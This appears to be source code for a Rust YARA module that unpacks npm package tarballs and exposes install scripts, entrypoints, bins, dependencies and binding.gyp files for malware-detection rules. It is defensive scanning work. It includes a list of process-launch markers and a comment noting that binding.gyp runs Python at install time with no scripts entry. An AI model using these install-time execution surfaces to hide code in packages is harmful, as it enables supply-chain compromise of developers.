/*! YARA module that parses npm package tarballs.

This allows creating YARA rules based on npm package metadata, lifecycle
scripts, entrypoints, and selected root-package file contents.
*/

use std::collections::{BTreeMap, BTreeSet};
use std::io::{Cursor, Read};
use std::path::{Component, Path};
use std::sync::LazyLock;

use flate2::read::GzDecoder;
use regex::Regex;
use serde_json::Value;
use tar::Archive;

use crate::modules::prelude::*;
use crate::modules::protos::npm::{
    Bin, Dependency, File as NpmFile, Npm, Script,
};

const MAX_MANIFEST_TEXT_BYTES: usize = 512 * 1024;
const MAX_INSTALL_SCRIPT_TEXT_BYTES: usize = 16 * 1024 * 1024;
const MAX_ENTRYPOINT_TEXT_BYTES: usize = 8 * 1024 * 1024;
const MAX_BUILD_CONFIG_TEXT_BYTES: usize = 2 * 1024 * 1024;
const MAX_SCRIPTS_DIR_TEXT_BYTES: usize = 2 * 1024 * 1024;
const MAX_EAGER_TEXT_CACHE_TOTAL_BYTES: usize = 64 * 1024 * 1024;
const MAX_TRANSITIVE_INSTALL_SCRIPT_DEPTH: usize = 2;
const MAX_INSTALL_SCRIPT_FILES: usize = 16;
const MAX_TRANSITIVE_ENTRYPOINT_DEPTH: usize = 3;
const MAX_TRANSITIVE_ENTRYPOINT_FILES: usize = 32;
const MODULE_ECOSYSTEM: &[u8] = b"npm";

static LOCAL_MODULE_SPEC_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"(?x)
        require\s*\(\s*["'`](\.[^"'`]+)["'`]\s*\)
        |
        import\s*\(\s*["'`](\.[^"'`]+)["'`]\s*\)
        |
        import\s+["'`](\.[^"'`]+)["'`]
        |
        from\s+["'`](\.[^"'`]+)["'`]
    "#,
    )
    .expect("compile local npm module spec regex")
});

static LOCAL_EXECUTABLE_LITERAL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r#"["'`]((?:\./|\../)?[^"'`\s]+?\.(?:js|mjs|cjs|sh|ps1|cmd|bat|py))["'`]"#,
    )
    .expect("compile local executable literal regex")
});

#[derive(Debug, Clone)]
struct ArchiveFile {
    path: String,
    size_bytes: u64,
    text_content: Option<String>,
    is_vendored: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FileRole {
    Manifest,
    InstallScript,
    Entrypoint,
    Binary,
    Source,
    Config,
    Doc,
    BuildConfig,
    Vendored,
}

impl FileRole {
    fn as_str(self) -> &'static str {
        match self {
            Self::Manifest => "manifest",
            Self::InstallScript => "install_script",
            Self::Entrypoint => "entrypoint",
            Self::Binary => "binary",
            Self::Source => "source",
            Self::Config => "config",
            Self::Doc => "doc",
            Self::BuildConfig => "build_config",
            Self::Vendored => "vendored",
        }
    }
}

#[module_main]
fn main(data: &[u8], _meta: Option<&[u8]>) -> Result<Npm, ModuleError> {
    let mut npm = Npm::new();
    npm.set_is_npm(false);
    npm.set_has_manifest(false);
    npm.set_has_install_script(false);
    npm.set_has_bin(false);
    npm.set_has_repository(false);
    npm.set_windows_target(false);
    npm.set_dependency_count(0);
    npm.set_root_file_count(0);
    npm.set_vendored_file_count(0);
    npm.set_has_native_gyp(false);

    if let Some(meta) = _meta
        && meta != MODULE_ECOSYSTEM
    {
        return Ok(npm);
    }

    let Some(ExtractedArchive {
        files: entries,
        text_cache,
    }) = extract_archive_entries(data)
    else {
        return Ok(npm);
    };

    let Some((root_prefix, manifest_archive_path)) = select_root_manifest(&entries) else {
        return Ok(npm);
    };

    let Some(manifest_entry) = entries.get(&manifest_archive_path) else {
        return Ok(npm);
    };
    let Some(package_json) = manifest_entry.text_content.clone() else {
        return Ok(npm);
    };
    let Ok(manifest) = serde_json::from_str::<Value>(&package_json) else {
        return Ok(npm);
    };

    let mut root_files = build_root_files(&entries, &root_prefix);
    let root_manifest_path = manifest_archive_path
        .strip_prefix(&root_prefix)
        .unwrap_or(&manifest_archive_path)
        .to_string();

    npm.set_is_npm(true);
    npm.set_has_manifest(true);
    npm.set_package_json(package_json);

    if let Some(name) = manifest.get("name").and_then(Value::as_str) {
        npm.set_name(name.to_ascii_lowercase());
    }
    if let Some(version) = manifest.get("version").and_then(Value::as_str) {
        npm.set_version(version.to_string());
    }
    if let Some(author) = parse_author(&manifest) {
        npm.set_author(author.to_ascii_lowercase());
    }
    if let Some(package_manager) = manifest.get("packageManager").and_then(Value::as_str) {
        npm.set_package_manager(package_manager.to_ascii_lowercase());
    }
    if parse_repository(&manifest).is_some() {
        npm.set_has_repository(true);
    }
    if has_windows_target(&manifest) {
        npm.set_windows_target(true);
    }

    let dependencies = collect_dependencies(&manifest);
    if !dependencies.is_empty() {
        npm.set_dependency_count(dependencies.len() as i64);
        npm.dependencies.extend(dependencies);
    }

    let mut install_script_paths = BTreeSet::new();
    let mut resolved_scripts = Vec::new();
    if let Some(scripts) = manifest.get("scripts").and_then(Value::as_object) {
        let mut has_install_script = false;
        for (name, command) in scripts.iter().filter_map(|(name, value)| {
            value.as_str().map(|command| (name.to_ascii_lowercase(), command))
        }) {
            let install_lifecycle = is_install_lifecycle_stage(&name);
            let target_path = resolve_command_target(command, &root_files);
            if install_lifecycle {
                has_install_script = true;
                if let Some(target_path) = &target_path {
                    install_script_paths.insert(target_path.clone());
                }
            }
            resolved_scripts.push((name.clone(), command.to_string(), target_path));
        }
        npm.set_has_install_script(has_install_script);
    }

    let mut entrypoint_paths = BTreeSet::new();
    let mut resolved_main_path = None;
    if let Some(main) = manifest.get("main").and_then(Value::as_str)
        && let Some(path) = resolve_relative_file(main, &root_files)
    {
        resolved_main_path = Some(path.clone());
        entrypoint_paths.insert(path);
    }

    let resolved_bins = collect_bins(&manifest);
    if !resolved_bins.is_empty() {
        npm.set_has_bin(true);
        for (_, path) in &resolved_bins {
            if let Some(resolved) = resolve_relative_file(path, &root_files) {
                entrypoint_paths.insert(resolved);
            }
        }
    }

    hydrate_selected_root_text_content(
        data,
        &root_prefix,
        &root_manifest_path,
        &install_script_paths,
        &entrypoint_paths,
        &text_cache,
        &mut root_files,
    );
    expand_transitive_install_script_paths(
        data,
        &root_prefix,
        &root_manifest_path,
        &mut install_script_paths,
        &entrypoint_paths,
        &text_cache,
        &mut root_files,
    );
    expand_transitive_entrypoint_paths(
        data,
        &root_prefix,
        &root_manifest_path,
        &install_script_paths,
        &mut entrypoint_paths,
        &text_cache,
        &mut root_files,
    );

    for (name, command, target_path) in resolved_scripts {
        let mut script = Script::new();
        script.set_name(name);
        script.set_command(command);
        if let Some(target_path) = target_path {
            script.set_target_path(target_path.clone());
            if let Some(content) = selected_text_content(&root_files, &target_path) {
                script.set_content(content.to_string());
            }
        }
        npm.scripts.push(script);
    }

    if let Some(path) = resolved_main_path {
        npm.set_main_path(path.clone());
        if let Some(content) = selected_text_content(&root_files, &path) {
            npm.set_main_content(content.to_string());
        }
    }

    for (name, path) in resolved_bins {
        let resolved_path =
            resolve_relative_file(&path, &root_files).unwrap_or_else(|| normalize_path(&path));
        let mut bin = Bin::new();
        bin.set_name(name);
        bin.set_path(resolved_path.clone());
        if let Some(content) = selected_text_content(&root_files, &resolved_path) {
            bin.set_content(content.to_string());
        }
        npm.bins.push(bin);
    }

    let mut root_file_count = 0i64;
    let mut vendored_file_count = 0i64;
    for (path, file) in &root_files {
        let role = classify_file_role(
            path,
            file.is_vendored,
            path == &root_manifest_path,
            &install_script_paths,
            &entrypoint_paths,
        );

        if file.is_vendored {
            vendored_file_count += 1;
        } else {
            root_file_count += 1;
        }
        if role == FileRole::BuildConfig {
            npm.set_has_native_gyp(true);
        }

        let mut npm_file = NpmFile::new();
        npm_file.set_path(path.clone());
        npm_file.set_role(role.as_str().to_string());
        npm_file.set_is_root(!file.is_vendored);
        npm_file.set_is_vendored(file.is_vendored);
        npm_file.set_is_text(file.text_content.is_some());
        npm_file.set_size_bytes(file.size_bytes);
        if should_expose_file_content(role, file) && let Some(content) = &file.text_content {
            npm_file.set_content(content.clone());
        }
        npm.files.push(npm_file);
    }

    npm.set_root_file_count(root_file_count);
    npm.set_vendored_file_count(vendored_file_count);

    Ok(npm)
}

#[module_export(name = "depends_on")]
fn depends_on(ctx: &mut ScanContext, dependency: RuntimeString) -> Option<bool> {
    let dependency = dependency.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(
        npm.dependencies
            .iter()
            .any(|dep| dep.name.as_deref() == Some(dependency.as_str())),
    )
}

#[module_export(name = "depends_on")]
fn depends_on_in_section(
    ctx: &mut ScanContext,
    dependency: RuntimeString,
    section: RuntimeString,
) -> Option<bool> {
    let dependency = dependency.to_str(ctx).ok()?.to_ascii_lowercase();
    let section = section.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(npm.dependencies.iter().any(|dep| {
        dep.name.as_deref() == Some(dependency.as_str())
            && dep.section.as_deref() == Some(section.as_str())
    }))
}

#[module_export(name = "has_script")]
fn has_script(ctx: &mut ScanContext, stage: RuntimeString) -> Option<bool> {
    let stage = stage.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(find_script(npm, &stage).is_some())
}

#[module_export(name = "script_contains")]
fn script_contains(
    ctx: &mut ScanContext,
    stage: RuntimeString,
    needle: RuntimeString,
) -> Option<bool> {
    let stage = stage.to_str(ctx).ok()?.to_ascii_lowercase();
    let needle = needle.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    let script = find_script(npm, &stage)?;

    Some(
        script
            .command
            .as_deref()
            .is_some_and(|value| contains_case_insensitive(value, &needle))
            || script
                .target_path
                .as_deref()
                .is_some_and(|value| contains_case_insensitive(value, &needle))
            || script
                .content
                .as_deref()
                .is_some_and(|value| contains_case_insensitive(value, &needle)),
    )
}

#[module_export(name = "has_bin_named")]
fn has_bin_named(ctx: &mut ScanContext, name: RuntimeString) -> Option<bool> {
    let name = name.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(
        npm.bins
            .iter()
            .any(|bin| bin.name.as_deref() == Some(name.as_str())),
    )
}

#[module_export(name = "bin_contains")]
fn bin_contains(
    ctx: &mut ScanContext,
    name: RuntimeString,
    needle: RuntimeString,
) -> Option<bool> {
    let name = name.to_str(ctx).ok()?.to_ascii_lowercase();
    let needle = needle.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    let bin = npm
        .bins
        .iter()
        .find(|bin| bin.name.as_deref() == Some(name.as_str()))?;
    Some(
        bin.path
            .as_deref()
            .is_some_and(|value| contains_case_insensitive(value, &needle))
            || bin
                .content
                .as_deref()
                .is_some_and(|value| contains_case_insensitive(value, &needle)),
    )
}

#[module_export(name = "main_contains")]
fn main_contains(ctx: &mut ScanContext, needle: RuntimeString) -> Option<bool> {
    let needle = needle.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(
        npm.main_path
            .as_deref()
            .is_some_and(|value| contains_case_insensitive(value, &needle))
            || npm
                .main_content
                .as_deref()
                .is_some_and(|value| contains_case_insensitive(value, &needle)),
    )
}

#[module_export(name = "has_file")]
fn has_file(ctx: &mut ScanContext, path: RuntimeString) -> Option<bool> {
    let path = normalize_lookup(path.to_str(ctx).ok()?);
    let npm = ctx.module_output::<Npm>()?;
    Some(find_file(npm, &path).is_some())
}

#[module_export(name = "file_contains")]
fn file_contains(
    ctx: &mut ScanContext,
    path: RuntimeString,
    needle: RuntimeString,
) -> Option<bool> {
    let path = normalize_lookup(path.to_str(ctx).ok()?);
    let needle = needle.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    let file = find_file(npm, &path)?;
    Some(
        file.content
            .as_deref()
            .is_some_and(|content| contains_case_insensitive(content, &needle)),
    )
}

#[module_export(name = "any_file_contains")]
fn any_file_contains(
    ctx: &mut ScanContext,
    role: RuntimeString,
    needle: RuntimeString,
) -> Option<bool> {
    let role = role.to_str(ctx).ok()?.to_ascii_lowercase();
    let needle = needle.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(npm.files.iter().any(|file| {
        file.role.as_deref() == Some(role.as_str())
            && file
                .content
                .as_deref()
                .is_some_and(|content| contains_case_insensitive(content, &needle))
    }))
}

#[module_export(name = "file_count")]
fn file_count(ctx: &mut ScanContext, role: RuntimeString) -> Option<i64> {
    let role = role.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(
        npm.files
            .iter()
            .filter(|file| file.role.as_deref() == Some(role.as_str()))
            .count() as i64,
    )
}

#[module_export(name = "name_contains")]
fn name_contains(ctx: &mut ScanContext, needle: RuntimeString) -> Option<bool> {
    let needle = needle.to_str(ctx).ok()?.to_ascii_lowercase();
    let npm = ctx.module_output::<Npm>()?;
    Some(
        npm.name
            .as_deref()
            .is_some_and(|name| contains_case_insensitive(name, &needle)),
    )
}

/// The decompressed entries plus an eager cache of text-file content, keyed
/// by archive path. Later hydration passes read from the cache instead of
/// re-decompressing the archive; the cache is best-effort (budget-capped),
/// so hydration falls back to a decompression pass on a miss.
struct ExtractedArchive {
    files: BTreeMap<String, ArchiveFile>,
    text_cache: BTreeMap<String, String>,
}

fn extract_archive_entries(data: &[u8]) -> Option<ExtractedArchive> {
    let decoder = GzDecoder::new(Cursor::new(data));
    let mut archive = Archive::new(decoder);
    let mut files = BTreeMap::new();
    let mut text_cache = BTreeMap::new();
    let mut cached_bytes = 0usize;

    let entries = archive.entries().ok()?;
    for entry in entries {
        let mut entry = entry.ok()?;
        if !entry.header().entry_type().is_file() {
            continue;
        }
        let path = normalize_path(&entry.path().ok()?.to_string_lossy());
        let mut bytes = Vec::new();
        if entry.read_to_end(&mut bytes).is_err() {
            return None;
        }
        let is_vendored = is_vendored_path(&path);
        let size_bytes = bytes.len() as u64;
        let text_content = if !is_vendored
            && path.ends_with("package.json")
            && bytes.len() <= MAX_MANIFEST_TEXT_BYTES
            && looks_like_text(&bytes)
        {
            String::from_utf8(bytes.clone()).ok()
        } else {
            None
        };
        if text_content.is_none()
            && !is_vendored
            && bytes.len() <= MAX_INSTALL_SCRIPT_TEXT_BYTES
            && cached_bytes.saturating_add(bytes.len()) <= MAX_EAGER_TEXT_CACHE_TOTAL_BYTES
            && looks_like_text(&bytes)
            && let Ok(content) = String::from_utf8(bytes)
        {
            cached_bytes += content.len();
            text_cache.insert(path.clone(), content);
        }
        files.insert(
            path.clone(),
            ArchiveFile {
                path,
                size_bytes,
                text_content,
                is_vendored,
            },
        );
    }

    Some(ExtractedArchive { files, text_cache })
}

fn select_root_manifest(entries: &BTreeMap<String, ArchiveFile>) -> Option<(String, String)> {
    for preferred in ["package/package.json", "package.json"] {
        if entries.contains_key(preferred) {
            return Some(root_prefix_for_manifest(preferred));
        }
    }

    entries
        .keys()
        .filter(|path| path.ends_with("/package.json") && !is_vendored_path(path))
        .min_by_key(|path| (path_depth(path), path.as_str()))
        .map(|path| root_prefix_for_manifest(path))
}

fn root_prefix_for_manifest(path: &str) -> (String, String) {
    let prefix = path
        .strip_suffix("package.json")
        .unwrap_or_default()
        .to_string();
    (prefix, path.to_string())
}

fn build_root_files(
    entries: &BTreeMap<String, ArchiveFile>,
    root_prefix: &str,
) -> BTreeMap<String, ArchiveFile> {
    entries
        .iter()
        .filter_map(|(archive_path, file)| {
            let relative = archive_path.strip_prefix(root_prefix)?;
            if relative.is_empty() {
                return None;
            }

            let mut file = file.clone();
            file.path = relative.to_string();
            file.is_vendored = is_vendored_path(relative);
            Some((relative.to_string(), file))
        })
        .collect()
}

fn parse_repository(manifest: &Value) -> Option<String> {
    let repository = manifest.get("repository")?;
    match repository {
        Value::String(value) if !value.is_empty() => Some(value.to_string()),
        Value::Object(object) => object
            .get("url")
            .and_then(Value::as_str)
            .filter(|value| !value.is_empty())
            .map(str::to_string),
        _ => None,
    }
}

fn parse_author(manifest: &Value) -> Option<String> {
    let author = manifest.get("author")?;
    match author {
        Value::String(value) if !value.is_empty() => Some(value.to_string()),
        Value::Object(object) => object
            .get("name")
            .and_then(Value::as_str)
            .filter(|value| !value.is_empty())
            .map(str::to_string),
        _ => None,
    }
}

fn collect_dependencies(manifest: &Value) -> Vec<Dependency> {
    let mut dependencies = Vec::new();

    for field in [
        "dependencies",
        "optionalDependencies",
        "peerDependencies",
        "devDependencies",
        "bundleDependencies",
        "bundledDependencies",
    ] {
        let Some(value) = manifest.get(field) else {
            continue;
        };

        match value {
            Value::Object(map) => {
                for (name, spec) in map {
                    let mut dependency = Dependency::new();
                    dependency.set_name(name.to_ascii_lowercase());
                    dependency.set_section(field.to_ascii_lowercase());
                    if let Some(spec) = spec.as_str() {
                        dependency.set_spec(spec.to_string());
                    }
                    dependencies.push(dependency);
                }
            }
            Value::Array(entries) => {
                for name in entries.iter().filter_map(Value::as_str) {
                    let mut dependency = Dependency::new();
                    dependency.set_name(name.to_ascii_lowercase());
                    dependency.set_section(field.to_ascii_lowercase());
                    dependencies.push(dependency);
                }
            }
            _ => {}
        }
    }

    dependencies.sort_by(|left, right| {
        left.name
            .cmp(&right.name)
            .then(left.section.cmp(&right.section))
            .then(left.spec.cmp(&right.spec))
    });
    dependencies.dedup_by(|left, right| {
        left.name == right.name && left.section == right.section && left.spec == right.spec
    });
    dependencies
}

fn collect_bins(manifest: &Value) -> Vec<(String, String)> {
    match manifest.get("bin") {
        Some(Value::String(path)) => manifest
            .get("name")
            .and_then(Value::as_str)
            .map(default_bin_name)
            .map(|name| (name, path.to_string()))
            .into_iter()
            .collect(),
        Some(Value::Object(object)) => object
            .iter()
            .filter_map(|(name, value)| value.as_str().map(|path| (name, path)))
            .map(|(name, path)| (name.to_ascii_lowercase(), path.to_string()))
            .collect(),
        _ => Vec::new(),
    }
}

fn default_bin_name(package_name: &str) -> String {
    package_name
        .rsplit('/')
        .next()
        .unwrap_or(package_name)
        .to_ascii_lowercase()
}

fn has_windows_target(manifest: &Value) -> bool {
    manifest
        .get("pkg")
        .and_then(Value::as_object)
        .and_then(|pkg| pkg.get("targets"))
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .any(|target| {
            let target = target.to_ascii_lowercase();
            target.contains("win") || target.contains("windows")
        })
}

fn resolve_command_target(
    command: &str,
    files: &BTreeMap<String, ArchiveFile>,
) -> Option<String> {
    command_candidate_paths(command)
        .into_iter()
        .find_map(|candidate| resolve_relative_file(&candidate, files))
}

fn resolve_relative_file(
    candidate: &str,
    files: &BTreeMap<String, ArchiveFile>,
) -> Option<String> {
    let candidate = candidate.trim_matches(|ch| matches!(ch, '"' | '\'' | '`'));
    if candidate.is_empty() {
        return None;
    }

    let candidate = normalize_lookup(candidate.trim_start_matches("./"));
    if candidate.is_empty() {
        return None;
    }

    files.keys().find(|path| normalize_lookup(path) == candidate).cloned()
}

fn command_candidate_paths(command: &str) -> Vec<String> {
    command
        .split(|ch: char| ch.is_whitespace() || matches!(ch, ';' | '&' | '|' | '(' | ')' | ','))
        .map(|token| token.trim_matches(|ch| matches!(ch, '"' | '\'' | '`')))
        .filter(|token| {
            token.contains('/')
                || token.contains('\\')
                || token.ends_with(".js")
                || token.ends_with(".mjs")
                || token.ends_with(".cjs")
                || token.ends_with(".sh")
                || token.ends_with(".ps1")
                || token.ends_with(".cmd")
                || token.ends_with(".bat")
                || token.ends_with(".py")
        })
        .map(str::to_string)
        .collect()
}

fn selected_text_content<'a>(
    files: &'a BTreeMap<String, ArchiveFile>,
    path: &str,
) -> Option<&'a str> {
    files.get(path).and_then(|file| file.text_content.as_deref())
}

fn hydrate_selected_root_text_content(
    data: &[u8],
    root_prefix: &str,
    root_manifest_path: &str,
    install_script_paths: &BTreeSet<String>,
    entrypoint_paths: &BTreeSet<String>,
    text_cache: &BTreeMap<String, String>,
    root_files: &mut BTreeMap<String, ArchiveFile>,
) {
    // Serve candidates from the eager text cache first; only fall back to a
    // fresh decompression pass when a candidate is missing from the cache.
    let mut cache_missed = false;
    let candidates = root_files
        .iter()
        .filter_map(|(relative, file)| {
            if file.is_vendored || file.text_content.is_some() {
                return None;
            }
            let role = classify_file_role(
                relative,
                file.is_vendored,
                relative == root_manifest_path,
                install_script_paths,
                entrypoint_paths,
            );
            let limit = selected_text_limit(relative, role)?;
            (file.size_bytes as usize <= limit).then(|| relative.clone())
        })
        .collect::<Vec<_>>();
    for relative in candidates {
        let archive_path = format!("{root_prefix}{relative}");
        if let Some(content) = text_cache.get(&archive_path) {
            if let Some(file) = root_files.get_mut(&relative) {
                file.text_content = Some(content.clone());
            }
        } else {
            cache_missed = true;
        }
    }
    if !cache_missed {
        return;
    }

    let decoder = GzDecoder::new(Cursor::new(data));
    let mut archive = Archive::new(decoder);
    let Ok(entries) = archive.entries() else {
        return;
    };

    for entry in entries {
        let Ok(mut entry) = entry else {
            return;
        };
        if !entry.header().entry_type().is_file() {
            continue;
        }

        let Ok(path) = entry.path() else {
            return;
        };
        let archive_path = normalize_path(&path.to_string_lossy());
        let Some(relative) = archive_path.strip_prefix(root_prefix) else {
            continue;
        };
        if relative.is_empty() {
            continue;
        }

        let Some(file) = root_files.get_mut(relative) else {
            continue;
        };
        if file.is_vendored || file.text_content.is_some() {
            continue;
        }

        let role = classify_file_role(
            relative,
            file.is_vendored,
            relative == root_manifest_path,
            install_script_paths,
            entrypoint_paths,
        );
        let Some(limit) = selected_text_limit(relative, role) else {
            continue;
        };
        if file.size_bytes as usize > limit {
            continue;
        }

        let mut bytes = Vec::new();
        if entry.read_to_end(&mut bytes).is_err() || !looks_like_text(&bytes) {
            continue;
        }

        file.text_content = String::from_utf8(bytes).ok();
    }
}

fn expand_transitive_entrypoint_paths(
    data: &[u8],
    root_prefix: &str,
    root_manifest_path: &str,
    install_script_paths: &BTreeSet<String>,
    entrypoint_paths: &mut BTreeSet<String>,
    text_cache: &BTreeMap<String, String>,
    root_files: &mut BTreeMap<String, ArchiveFile>,
) {
    let mut frontier: Vec<String> = entrypoint_paths.iter().cloned().collect();
    let mut visited = BTreeSet::new();

    for _depth in 0..MAX_TRANSITIVE_ENTRYPOINT_DEPTH {
        if frontier.is_empty() || entrypoint_paths.len() >= MAX_TRANSITIVE_ENTRYPOINT_FILES {
            break;
        }

        let mut next = Vec::new();
        for path in std::mem::take(&mut frontier) {
            if !visited.insert(path.clone()) {
                continue;
            }

            let Some(content) = selected_text_content(root_files, &path) else {
                continue;
            };

            for specifier in collect_local_module_specifiers(content) {
                let Some(resolved) = resolve_local_module_specifier(&path, &specifier, root_files)
                else {
                    continue;
                };
                if entrypoint_paths.insert(resolved.clone()) {
                    next.push(resolved);
                    if entrypoint_paths.len() >= MAX_TRANSITIVE_ENTRYPOINT_FILES {
                        break;
                    }
                }
            }
        }

        if next.is_empty() {
            break;
        }

        hydrate_selected_root_text_content(
            data,
            root_prefix,
            root_manifest_path,
            install_script_paths,
            entrypoint_paths,
            text_cache,
            root_files,
        );
        frontier = next;
    }
}

fn expand_transitive_install_script_paths(
    data: &[u8],
    root_prefix: &str,
    root_manifest_path: &str,
    install_script_paths: &mut BTreeSet<String>,
    entrypoint_paths: &BTreeSet<String>,
    text_cache: &BTreeMap<String, String>,
    root_files: &mut BTreeMap<String, ArchiveFile>,
) {
    let mut frontier: Vec<String> = install_script_paths.iter().cloned().collect();
    let mut visited = BTreeSet::new();

    for _depth in 0..MAX_TRANSITIVE_INSTALL_SCRIPT_DEPTH {
        if frontier.is_empty() || install_script_paths.len() >= MAX_INSTALL_SCRIPT_FILES {
            break;
        }

        let mut next = Vec::new();
        for path in std::mem::take(&mut frontier) {
            if !visited.insert(path.clone()) {
                continue;
            }

            let Some(content) = selected_text_content(root_files, &path) else {
                continue;
            };
            if !contains_local_process_launch_marker(content) {
                continue;
            }

            for specifier in collect_local_executable_specifiers(content) {
                let Some(resolved) = resolve_local_file_specifier(&path, &specifier, root_files)
                else {
                    continue;
                };
                if install_script_paths.insert(resolved.clone()) {
                    next.push(resolved);
                    if install_script_paths.len() >= MAX_INSTALL_SCRIPT_FILES {
                        break;
                    }
                }
            }
        }

        if next.is_empty() {
            break;
        }

        hydrate_selected_root_text_content(
            data,
            root_prefix,
            root_manifest_path,
            install_script_paths,
            entrypoint_paths,
            text_cache,
            root_files,
        );
        frontier = next;
    }
}

fn collect_local_module_specifiers(content: &str) -> Vec<String> {
    LOCAL_MODULE_SPEC_RE
        .captures_iter(content)
        .filter_map(|capture| {
            capture
                .iter()
                .skip(1)
                .flatten()
                .map(|matched| matched.as_str().to_string())
                .next()
        })
        .collect()
}

fn collect_local_executable_specifiers(content: &str) -> Vec<String> {
    LOCAL_EXECUTABLE_LITERAL_RE
        .captures_iter(content)
        .filter_map(|capture| capture.get(1).map(|matched| matched.as_str().to_string()))
        .collect()
}

fn contains_local_process_launch_marker(content: &str) -> bool {
    [
        "child_process",
        "execFile(",
        "execFileSync(",
        "exec(",
        "execSync(",
        "spawn(",
        "spawnSync(",
        "fork(",
    ]
    .iter()
    .any(|needle| content.contains(needle))
}

fn resolve_local_module_specifier(
    base_path: &str,
    specifier: &str,
    files: &BTreeMap<String, ArchiveFile>,
) -> Option<String> {
    if !specifier.starts_with("./") && !specifier.starts_with("../") {
        return None;
    }

    let base_dir = Path::new(base_path).parent().unwrap_or_else(|| Path::new(""));
    let relative = normalize_relative_module_path(base_dir.join(specifier))?;

    module_candidate_paths(&relative)
        .into_iter()
        .find_map(|candidate| resolve_relative_file(&candidate, files))
}

fn resolve_local_file_specifier(
    base_path: &str,
    specifier: &str,
    files: &BTreeMap<String, ArchiveFile>,
) -> Option<String> {
    let specifier = specifier.trim();
    if specifier.is_empty()
        || specifier.contains("://")
        || specifier.starts_with('/')
        || specifier.starts_with('\\')
    {
        return None;
    }

    let base_dir = Path::new(base_path).parent().unwrap_or_else(|| Path::new(""));
    let relative = normalize_relative_module_path(base_dir.join(specifier))?;
    resolve_relative_file(&relative, files)
}

fn normalize_relative_module_path(path: impl AsRef<Path>) -> Option<String> {
    let mut parts = Vec::new();
    for component in path.as_ref().components() {
        match component {
            Component::Normal(part) => parts.push(part.to_string_lossy().into_owned()),
            Component::CurDir => {}
            Component::ParentDir => {
                parts.pop()?;
            }
            Component::RootDir | Component::Prefix(_) => {}
        }
    }
    if parts.is_empty() {
        None
    } else {
        Some(parts.join("/"))
    }
}

fn module_candidate_paths(path: &str) -> Vec<String> {
    let normalized = normalize_path(path);
    if normalized.is_empty() {
        return Vec::new();
    }

    let mut candidates = vec![normalized.clone()];
    let has_extension = Path::new(&normalized).extension().is_some();
    if !has_extension {
        for extension in ["js", "mjs", "cjs", "json"] {
            candidates.push(format!("{normalized}.{extension}"));
        }
        for index in ["index.js", "index.mjs", "index.cjs", "index.json"] {
            candidates.push(format!("{normalized}/{index}"));
        }
    }
    candidates
}

fn classify_file_role(
    path: &str,
    is_vendored: bool,
    is_manifest: bool,
    install_script_paths: &BTreeSet<String>,
    entrypoint_paths: &BTreeSet<String>,
) -> FileRole {
    if is_vendored {
        return FileRole::Vendored;
    }
    if is_manifest {
        return FileRole::Manifest;
    }
    if install_script_paths.contains(path) {
        return FileRole::InstallScript;
    }
    if entrypoint_paths.contains(path) {
        return FileRole::Entrypoint;
    }
    if is_binary_path(path) {
        return FileRole::Binary;
    }
    if is_build_config_path(path) {
        return FileRole::BuildConfig;
    }
    if is_doc_path(path) {
        return FileRole::Doc;
    }
    if is_config_path(path) {
        return FileRole::Config;
    }
    FileRole::Source
}

/// node-gyp evaluates a package's `binding.gyp` `conditions` field as Python
/// code during `npm install`, with no package.json scripts entry, so build
/// configs deserve their own inspectable surface.
fn is_build_config_path(path: &str) -> bool {
    let lower = normalize_lookup(path);
    lower == "binding.gyp" || lower.ends_with("/binding.gyp")
}

fn should_expose_file_content(role: FileRole, file: &ArchiveFile) -> bool {
    if file.is_vendored || file.text_content.is_none() {
        return false;
    }

    matches!(
        role,
        FileRole::Manifest
            | FileRole::InstallScript
            | FileRole::Entrypoint
            | FileRole::BuildConfig
    ) || file.path.starts_with("scripts/")
}

fn selected_text_limit(path: &str, role: FileRole) -> Option<usize> {
    if path.starts_with("scripts/") {
        return Some(MAX_SCRIPTS_DIR_TEXT_BYTES);
    }

    match role {
        FileRole::Manifest => Some(MAX_MANIFEST_TEXT_BYTES),
        FileRole::InstallScript => Some(MAX_INSTALL_SCRIPT_TEXT_BYTES),
        FileRole::Entrypoint => Some(MAX_ENTRYPOINT_TEXT_BYTES),
        FileRole::BuildConfig => Some(MAX_BUILD_CONFIG_TEXT_BYTES),
        _ => None,
    }
}

fn normalize_path(path: &str) -> String {
    path.trim_start_matches("./").replace('\\', "/")
}

fn normalize_lookup(path: &str) -> String {
    normalize_path(path).to_ascii_lowercase()
}

fn path_depth(path: &str) -> usize {
    path.split('/').count()
}

fn is_vendored_path(path: &str) -> bool {
    path.starts_with("node_modules/") || path.contains("/node_modules/")
}

fn is_install_lifecycle_stage(stage: &str) -> bool {
    matches!(stage, "preinstall" | "install" | "postinstall")
}

fn is_binary_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    [".exe", ".dll", ".node", ".so", ".dylib"]
        .iter()
        .any(|suffix| lower.ends_with(suffix))
}

fn is_doc_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.starts_with("docs/")
        || lower.ends_with(".md")
        || lower.ends_with(".mdx")
        || lower.ends_with("readme")
        || lower.ends_with("readme.md")
}

fn is_config_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.ends_with(".json")
        || lower.ends_with(".yaml")
        || lower.ends_with(".yml")
        || lower.ends_with(".toml")
        || lower.ends_with(".ini")
        || lower.ends_with(".conf")
}

